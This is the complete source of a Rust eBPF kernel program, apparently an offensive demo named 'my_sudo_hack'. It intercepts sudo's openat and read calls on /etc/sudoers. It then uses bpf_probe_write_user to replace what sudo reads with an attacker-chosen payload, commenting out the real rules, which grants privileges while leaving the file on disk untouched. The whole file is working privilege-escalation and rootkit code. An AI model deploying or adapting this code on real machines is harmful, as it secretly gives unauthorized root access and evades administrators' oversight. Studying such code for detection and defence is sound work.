#![no_std]
#![no_main]

use core::ffi::c_void;

use aya_ebpf::{
    helpers::{
        bpf_get_current_comm, bpf_get_current_pid_tgid, bpf_get_current_uid_gid,
        gen::{bpf_probe_read, bpf_probe_read_user_str, bpf_probe_write_user},
    },
    macros::{map, tracepoint},
    maps::HashMap,
    programs::TracePointContext,
};
use aya_log_ebpf::info;
use my_sudo_hack_common::{payload, payload_len, uid, MAX_PAYLOAD_LEN};

#[map]
// Map to hold the File Descriptors from 'openat' calls
static map_fds: HashMap<u64, u32> = HashMap::<u64, u32>::with_max_entries(8192, 0);

#[map]
// Map to hold the buffer sized from 'read' calls
static map_buff_addrs: HashMap<u64, u64> = HashMap::<u64, u64>::with_max_entries(8192, 0);

const SUDO_LEN: usize = 5;
const SUDOERS_LEN: usize = 13;
const sudo: &[u8] = b"sudo\0";
const sudoers: &[u8] = b"/etc/sudoers\0";

#[tracepoint]
pub fn handle_openat_enter(ctx: TracePointContext) -> u32 {
    match hanle_openat_enter_function(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

#[tracepoint]
pub fn handle_openat_exit(ctx: TracePointContext) -> u32 {
    match handle_openat_exit_function(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

#[tracepoint]
pub fn handle_read_enter(ctx: TracePointContext) -> u32 {
    match handle_read_enter_function(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

#[tracepoint]
pub fn handle_read_exit(ctx: TracePointContext) -> u32 {
    match handle_read_exit_function(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

fn hanle_openat_enter_function(ctx: TracePointContext) -> Result<u32, u32> {
    // If filtering by UID check that
    if unsafe { uid != 0 } {
        let current_uid = bpf_get_current_uid_gid() >> 32;
        if unsafe { uid != current_uid as u32 } {
            return Ok(0);
        }
    }

    let comm = bpf_get_current_comm();
    if comm.is_err() {
        return Ok(0);
    }

    // Check comm is sudo
    let comm = comm.unwrap();
    for i in 0..SUDO_LEN {
        if comm[i] != sudo[i] {
            return Ok(0);
        }
    }

    let mut filename: [u8; SUDOERS_LEN] = [0; SUDOERS_LEN];

    let target_filename = unsafe { ctx.read_at::<u64>(24) };

    if target_filename.is_err() {
        return Ok(0);
    }
    let target_filename = target_filename.unwrap() as *const c_void;

    let ret = unsafe {
        bpf_probe_read_user_str(
            filename.as_mut_ptr() as *mut c_void,
            SUDOERS_LEN as u32,
            target_filename,
        )
    };

    if ret < 0 {
        return Err(0);
    }

    for i in 0..SUDOERS_LEN {
        if filename[i] != sudoers[i] {
            return Ok(0);
        }
    }

    // Add pid_tgid to map for our sys_exit call
    let pid_tgid = bpf_get_current_pid_tgid();
    let _ = map_fds.insert(&pid_tgid, &0, 0);

    Ok(0)
}

fn handle_openat_exit_function(ctx: TracePointContext) -> Result<u32, u32> {
    // Check this open call is opening our target file
    let pid_tgid = bpf_get_current_pid_tgid();
    let check = unsafe { map_fds.get(&pid_tgid) };
    if check.is_none() {
        return Ok(0);
    }

    // Set the map value to be the returned file descriptor
    let fd = unsafe { ctx.read_at::<u32>(16) };

    if fd.is_err() {
        return Ok(0);
    }

    let fd = fd.unwrap();
    let _ = map_fds.insert(&pid_tgid, &fd, 0);

    Ok(0)
}

fn handle_read_enter_function(ctx: TracePointContext) -> Result<u32, u32> {
    // Check this open call is opening our target file
    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;
    let pfd = unsafe { map_fds.get(&pid_tgid) };
    if pfd.is_none() {
        return Ok(0);
    }
    let pfd = pfd.unwrap();

    // Check this is the sudoers file descriptor
    let map_fd = *pfd;
    let fd = unsafe { ctx.read_at::<u32>(16) };

    if fd.is_err() {
        return Ok(0);
    }

    let fd = fd.unwrap();

    if map_fd != fd {
        return Ok(0);
    }

    // Store buffer address from arguments in map
    let buff_addr = unsafe { ctx.read_at::<u64>(24) };
    if buff_addr.is_err() {
        return Ok(0);
    }
    let buff_addr = buff_addr.unwrap();
    let _ = map_buff_addrs.insert(&pid_tgid, &buff_addr, 0);

    Ok(0)
}

fn handle_read_exit_function(ctx: TracePointContext) -> Result<u32, u32> {
    let pid_tgid = bpf_get_current_pid_tgid();
    let pbff_addr = unsafe { map_buff_addrs.get(&pid_tgid) };
    if pbff_addr.is_none() {
        return Ok(0);
    }
    let buff_addr = *pbff_addr.unwrap();
    if buff_addr == 0 {
        return Ok(0);
    }

    // This is amount of data returned from the read syscall
    let read_size = unsafe { ctx.read_at::<u64>(16) };
    if read_size.is_err() {
        return Ok(0);
    }
    let read_size = read_size.unwrap();
    if read_size == 0 {
        return Ok(0);
    }

    // Add our payload to the first line
    if unsafe { read_size < payload_len } {
        return Ok(0);
    }

    // Overwrite first chunk of data
    // then add '#'s to comment out rest of data in the chunk.
    // This method corrupts the sudoers file, but everything still
    // works as expected
    let mut local_buff: [u8; MAX_PAYLOAD_LEN] = [0; MAX_PAYLOAD_LEN];

    unsafe {
        bpf_probe_read(
            local_buff.as_mut_ptr() as *mut c_void,
            MAX_PAYLOAD_LEN as u32,
            buff_addr as *const c_void,
        );
    }

    for i in 0..MAX_PAYLOAD_LEN {
        if unsafe { i > payload_len as usize } {
            local_buff[i] = b'#';
        } else {
            local_buff[i] = unsafe { payload[i] };
        }
    }

    // Write data back to buffer
    let ret = unsafe {
        bpf_probe_write_user(
            buff_addr as *mut c_void,
            local_buff.as_ptr() as *const c_void,
            MAX_PAYLOAD_LEN as u32,
        )
    };

    if ret.is_negative() {
        return Ok(0);
    }

    Ok(0)
}

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
